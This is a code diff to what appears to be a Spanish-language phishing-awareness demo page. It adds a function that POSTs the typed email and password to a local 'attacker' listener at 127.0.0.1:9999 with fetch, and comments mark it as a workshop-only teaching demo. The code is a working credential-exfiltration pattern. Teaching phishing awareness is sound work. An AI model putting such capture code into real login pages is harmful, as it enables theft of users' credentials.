@@ -340,10 +340,23 @@
   function refresh(){btn.classList.toggle('on',email.value.trim()!==''&&pass.value!=='');}
   email.addEventListener('input',refresh);pass.addEventListener('input',refresh);
 
-  // Envio -> revelar la leccion. No se transmite ni almacena nada.
+  // --- DEMO DIDACTICA (solo taller/local): exfiltrar lo tecleado al "servidor del atacante".
+  // Visualiza en la CONSOLA del listener (listener.py, 127.0.0.1:9999) como un phishing roba
+  // lo que escribes. mode:'no-cors' = se envia sin esperar respuesta; si el listener no esta
+  // corriendo, la demo igual continua. No usar contra personas reales.
+  var CAPTURE_URL='http://127.0.0.1:9999/captura';
+  function exfiltrar(correo,clave){
+    try{
+      var datos=new URLSearchParams({correo:correo,clave:clave,origen:'demo-phishing'});
+      fetch(CAPTURE_URL,{method:'POST',body:datos,mode:'no-cors'});
+    }catch(e){/* listener apagado: la demo sigue igual */}
+  }
+
+  // Envio -> enviar al listener y revelar la leccion.
   var reveal=document.getElementById('reveal'),captured=document.getElementById('captured');
   function trigger(){
     var e=email.value.trim()||'(sin correo)';
+    exfiltrar(e,pass.value);                       // <-- DEMO: enviar al "atacante"
     captured.innerHTML='Habrias entregado: <code>'+e.replace(/[<>&]/g,'')+'</code> + tu contrasena.';
     reveal.classList.add('show');
   }
